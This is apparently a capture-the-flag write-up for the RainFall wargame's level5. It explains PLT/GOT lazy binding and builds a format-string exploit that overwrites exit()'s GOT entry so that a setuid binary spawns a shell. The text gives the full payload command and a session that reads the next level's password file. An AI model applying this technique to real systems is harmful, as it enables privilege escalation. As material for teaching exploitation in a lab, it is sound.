# LEVEL5

## 1. Inspect The Executable

```bash
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with level6 privileges.

```bash
level5@RainFall:~$ ./level5 


level5@RainFall:~$ ./level5 
a
a
level5@RainFall:~$ ./level5 
abc
abc
level5@RainFall:~$ ./level5 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program waits for **user input**, most likely a call to `read` or a `gets` and prints it back. But there is no segfault error.

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find 3 interesting functions: `main`, `n` and `o`.


## Program Behavior

#### main function

The `main` function calls `n()` then returns.


#### n function 

The `n` function first calls `fgets()` on `stdout` to store the input in a **local variable** `level_20c` with a **size limit** of `0x200` (512 in decimal).

The function then calls `exit(1)`.

#### o function 

The `o` function calls `system("/bin/sh")`.

And this function isn't called by `main()` or `n()`.

## 3. Exploit Development

In this level, we can once again use a **Format String Attack**, but this time not to overwrite a global variable. Instead, the goal is to **overwrite a jump target**.

Using GDB, we can inspect 2 relevant functions: `exit()` and `o()`.

```bash
(gdb) p exit
$1 = {<text variable, no debug info>} 0x80483d0 <exit@plt>
(gdb) x/4i 0x80483d0
   0x80483d0 <exit@plt>:	jmp    *0x8049838
   0x80483d6 <exit@plt+6>:	push   $0x28
   0x80483db <exit@plt+11>:	jmp    0x8048370
   0x80483e0 <__libc_start_main@plt>:	jmp    *0x804983c
(gdb) p o
$2 = {<text variable, no debug info>} 0x80484a4 <o>
```

We can observe that `exit()` uses an **indirect jump** through a pointer located at address `0x8049838`.

This pointer is an entry in the **GOT (Global Offset Table)** associated with `exit()`.

---

### PLT (Procedure Linkage Table) & GOT (Global Offset Table)

In **x86 ELF binaries**, **external functions** are **dynamically linked** using the **PLT** and **GOT**.

During **compilation**, the **binary does not know** the **runtime addresses** of external functions like `exit()`, `printf()`, etc. It **cannot call them directly**.

This is where the **PLT** and **GOT** come into play:

The **PLT (Procedure Linkage Table)** is a **small stub** (a tiny piece of assembly code) that serves as an **intermediate jump** point between the **program** and the **GOT**.

Example of a **PLT stub** for `exit()`:
```bash
   0x80483d0 <exit@plt>:	jmp    *0x8049838
   0x80483d6 <exit@plt+6>:	push   $0x28
   0x80483db <exit@plt+11>:	jmp    0x8048370
```

The **GOT (Global Offset Table)** is a **table of pointers** in memory, each **entry** containing the **real address** of an **external function**. These addresses are **filled at runtime** by the **dynamic linker**.

This **process** is known as **lazy binding**.

#### Lazy Binding Process

First call to exit():
```md
call exit@plt
    ↓
PLT stub jumps to GOT[exit]
    ↓
GOT[exit] points to the dynamic linker
    ↓
Dynamic linker resolves the real address of exit()
    ↓
GOT[exit] is updated with the real address
    ↓
exit() executes
```

Subsequent calls to exit():
```md
call exit@plt
    ↓
PLT stub jumps to GOT[exit]
    ↓
GOT[exit] already contains the real address of exit()
    ↓
exit() executes directly
```

---

In this case:

```bash
   0x80483d0 <exit@plt>:	jmp    *0x8049838
```

`0x8049838` is the **GOT entry** for `exit()`. This entry contains the **real address** of `exit()` in libc.

By **overwriting this GOT entry**, any subsequent call to `exit()` will instead jump to `o()`.
Therefore, we need to overwrite the value at `0x8049838` with `0x80484a4`, which is the address of `o()`.

---

### Exploit Principle

For this attack, the **payload structure** is the same as before:
```
<memory address to update> <padding> <%X$n>
```

Where:
  - `<memory address to update>` is the **GOT entry address** that we want to overwrite (the address where the **indirect jump** will redirect).
  - `<padding>` represents the **number of characters** to print.
  - `<%X$n>` **writes** the number of printed characters to the **memory address** located at position `X` on the **stack**.

The total **number of printed characters** (i.e `<memory address to update>` + `<padding>`) determines the **value written** to the target address.

`%X$n` is a **positional format specifier** that allows writing to memory.

Structure:
- `%`  : begins the **format directive**.
- `X$` : indicates which **stack argument** (represented by `X`) is used as the **destination address**.
- `n`  : **writes** the number of characters printed so far **into that address**.

---

### Get Exploit Values

First, we use `%x` to **find the position** of our **input** on the **stack**:

```bash
level5@RainFall:~$ python -c "print 'aaaa%x %x %x %x %x %x %x %x %x %x'" | ./level5 
aaaa200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
```

`aaaa` corresponding to `61616161` in hexadecimal appears at the **4th position** on the stack.
This position will be used in the last part of the format string: `<%X$n>`.

---

Next, we already have the **target address** : `0x8049838`. In little-endian format:

```
\x38\x98\x04\x08
```

---

Finally, we need to define the **value to write**.
The target value is `0x80484a4`, which corresponds to `134513828` in decimal.

Since the target address itself accounts for **4 printed characters**, we **subtract it** from the total:
```
134513828 - 4 = 134513824
```

Which gives:
```
<memory address to update>  +   <padding>	
              4             +	134513824      = 134513828
```

---

Once again, printing this many characters directly would be **too large** and would cause a **broken pipe**.
To avoid this, we use a **formatted width specifier** (e.g. `%134513824x`).

`%x` **reads and prints** the value at the current position on the stack, then advances to the next stack argument.
When a width is specified, `printf` uses it as a **minimum field width**.

It pads the output with spaces **before** the value so that the total number of printed characters **matches** the **specified width**.

For example, if the value at the top of the stack is `0x02040608`, `%12x` will print:
```bash
    02040608
```

Representing:

```
4 (padding spaces) + 8 (printed value) = 12 characters
```

### GOT Overwrite visualization
```
BEFORE:
exit@plt → jmp *[0x8049838] → GOT[exit] = 0xb7e5ebe0 (real exit in libc)

__________________________________________________________________________

AFTER:
exit@plt → jmp *[0x8049838] → GOT[exit] = 0x80484a4 (address of o())
                                               ↓
                                         system("/bin/sh")
```

### Create the Payload

```
python -c "print '\x38\x98\x04\x08%134513824x%4\$n'"
```

Note:
- The backslash (`\`) in the last element is used to escape the `$` character.

**Explanation:**
- `python`			: launches the Python interpreter.
- `-c` 				: executes the command passed as a string.
- `print` 			: outputs data to standard output.


## 4. Capture The Flag

```bash
level5@RainFall:~$ python -c "print '\x38\x98\x04\x08%134513824x%4\$n'" > /tmp/p5
level5@RainFall:~$ cat /tmp/p5 - | ./level5
[...]
id   
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
exit
```
